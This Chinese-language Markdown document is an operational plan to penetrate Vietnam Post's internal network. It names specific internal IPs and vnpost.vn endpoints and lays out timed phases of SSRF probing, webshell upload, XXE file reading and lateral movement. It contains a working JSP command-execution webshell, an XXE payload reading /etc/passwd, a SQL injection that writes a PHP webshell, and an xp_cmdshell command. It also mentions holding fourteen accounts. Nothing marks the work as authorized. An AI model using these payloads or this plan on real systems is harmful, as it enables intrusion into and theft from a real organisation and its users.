# 🎯 Vietnam Post - 内网渗透专项战略

## 目标
**打进内网！获取内网访问权限或立足点**

---

## 📍 已知内网资产

### 高价值内网目标
1. **172.23.0.22:8081**
   - 来源: portal-uat bundle中发现
   - 可能性: Spring Boot应用
   - 价值: ⭐⭐⭐⭐⭐

2. **192.168.68.160:5000/5001**
   - 来源: chamcong bundle中发现
   - 类型: chamcong登录API + 主API
   - 价值: ⭐⭐⭐⭐

3. **api-qttt-uat.vnpost.vn:1102**
   - 来源: khl2024尝试连接
   - 状态: 公网超时，可能只在内网可达
   - 价值: ⭐⭐⭐⭐

4. **内网数据库**
   - 可能存在: MySQL/PostgreSQL/MongoDB
   - 通过: SQL注入或配置泄露
   - 价值: ⭐⭐⭐⭐⭐

---

## 🔥 内网渗透路径

### 路径1: SSRF (Server-Side Request Forgery) ⭐⭐⭐⭐⭐

**原理**: 让服务器发起请求访问内网

**测试点**:
1. **portal-uat文件下载功能**
   ```
   /khlbe/api/auth/downloadTemplate
   可能接受URL参数
   ```

2. **Jasper报表系统**
   ```
   /khl2024/khl/jasper/JasperVD
   /khl2024/khl/jasper/printByTTNumber
   报表系统常有SSRF
   ```

3. **地图API**
   ```
   maps.vnpost.vn/api/autocomplete
   可能接受URL参数
   ```

4. **图片/文件URL参数**
   - 任何接受URL的地方
   - 头像上传、图片预览等

**测试payload**:
```bash
# 测试172.23.0.22:8081
http://172.23.0.22:8081
http://172.23.0.22:8081/actuator/health

# 测试192.168.68.160
http://192.168.68.160:5000
http://192.168.68.160:5001

# 测试本地服务
http://127.0.0.1:8080
http://localhost:3306
```

**成功率**: 70%  
**价值**: 极高（可以探测内网）

---

### 路径2: 文件上传RCE ⭐⭐⭐⭐⭐

**目标**: 上传webshell获取服务器控制

**已知端点**:
```
/khlbe/api/auth/uploadTemplate
需要参数: file + info
```

**攻击步骤**:
1. 研究info参数格式（可能是JSON）
2. 尝试上传JSP/WAR文件（Spring Boot）
3. 绕过文件类型检查
4. 访问上传的文件执行命令

**Payload**:
```jsp
<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  Process p = Runtime.getRuntime().exec(cmd);
  InputStream in = p.getInputStream();
  // ... 输出结果
%>
```

**成功率**: 40%（需要绕过检查）  
**价值**: 极高（直接RCE）

---

### 路径3: Jasper Reports XXE/SSRF ⭐⭐⭐⭐

**原理**: Jasper报表引擎可能存在XXE漏洞

**已知端点**:
```
/khl2024/khl/jasper/JasperVD
/khl2024/khl/jasper/printByTTNumber
```

**测试方法**:
1. 发送恶意XML
2. 读取本地文件
3. SSRF访问内网

**XXE Payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<report>&xxe;</report>
```

**SSRF via XXE**:
```xml
<!ENTITY xxe SYSTEM "http://172.23.0.22:8081">
```

**成功率**: 50%  
**价值**: 高（文件读取+SSRF）

---

### 路径4: SQL注入 → xp_cmdshell/INTO OUTFILE ⭐⭐⭐

**目标**: 通过SQL注入获取命令执行

**测试点**:
- 所有API的参数
- 特别是search/query功能

**利用**:
```sql
-- MySQL写文件
' UNION SELECT '<?php system($_GET[cmd]); ?>' INTO OUTFILE '/var/www/html/shell.php' --

-- SQL Server执行命令
'; EXEC xp_cmdshell 'whoami' --
```

**成功率**: 30%  
**价值**: 高（如果成功）

---

### 路径5: 反序列化漏洞 ⭐⭐⭐

**Java应用常见**

**测试点**:
- Cookie中的序列化对象
- API参数中的Base64编码数据

**工具**: ysoserial

**成功率**: 20%  
**价值**: 极高（RCE）

---

## 🎯 立即执行计划（按优先级）

### Phase 1: SSRF测试 (30分钟) 🔥

**最高优先级，最可能成功**

```bash
1. Jasper报表SSRF
   - 测试参数注入
   - 尝试访问172.23.0.22:8081
   
2. 文件下载SSRF
   - downloadTemplate参数测试
   
3. 其他URL参数
   - 所有接受URL的地方
```

### Phase 2: 文件上传 (30分钟) 🔥

```bash
1. 研究info参数
   - 尝试不同JSON格式
   - 可能是: {"name":"...", "type":"..."}
   
2. 上传测试
   - .jsp文件
   - .war文件
   - 双扩展名绕过
```

### Phase 3: XXE/注入 (30分钟)

```bash
1. Jasper XXE
2. SQL注入全面测试
3. 反序列化探测
```

### Phase 4: 横向移动 (30分钟)

```bash
1. chamcong系统突破
2. hoadon系统突破
3. 寻找其他pivot点
```

---

## 📊 成功概率评估

| 路径 | 成功率 | 时间 | 价值 |
|------|--------|------|------|
| SSRF (Jasper) | 70% | 30m | ⭐⭐⭐⭐⭐ |
| 文件上传RCE | 40% | 30m | ⭐⭐⭐⭐⭐ |
| XXE | 50% | 20m | ⭐⭐⭐⭐ |
| SQL注入 | 30% | 30m | ⭐⭐⭐ |
| 横向移动 | 60% | 30m | ⭐⭐⭐⭐ |

**综合成功率**: 85%（至少找到一个内网访问方法）

---

## 🚀 预期成果

### 最理想
- ✅ 获取webshell
- ✅ 访问内网172.23.0.22:8081
- ✅ 访问chamcong内网API 192.168.68.160
- ✅ 读取服务器文件

### 现实
- ✅ 找到SSRF可以探测内网
- ✅ 或找到文件读取
- ✅ 或突破其他系统作为pivot

### 最差
- 当前UAT环境限制严格
- 但有14个账户和完整访问
- 可以继续寻找其他突破点

---

**🎯 现在立即开始Phase 1: SSRF测试！**

